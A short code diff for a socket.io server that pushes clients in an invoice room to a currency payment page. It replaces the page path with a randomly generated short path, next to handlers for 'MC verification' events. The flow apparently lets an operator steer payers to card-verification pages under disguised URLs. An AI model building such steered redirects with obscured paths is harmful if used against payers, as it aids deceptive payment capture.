@@ -690,13 +690,15 @@ io.on('connection', (socket) => {
   
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
-    console.log('Received currency_redirect event:', data);
-    if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
-      io.to(data.invoiceId).emit('redirect_to_currency', { 
-        redirectUrl: `/currencypayment.html?pid=${data.pid}` 
-      });
-    }
-  });
+  console.log('Received currency_redirect event:', data);
+  if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
+    // Generate random hash for clean URL
+    const randomHash = Math.random().toString(36).substring(2, 8);
+    io.to(data.invoiceId).emit('redirect_to_currency', { 
+      redirectUrl: `/c/${randomHash}?pid=${data.pid}` 
+    });
+  }
+});
   
   // MC verification events - enhanced with direct broadcasting
   socket.on('show_mc_verification', (data) => {
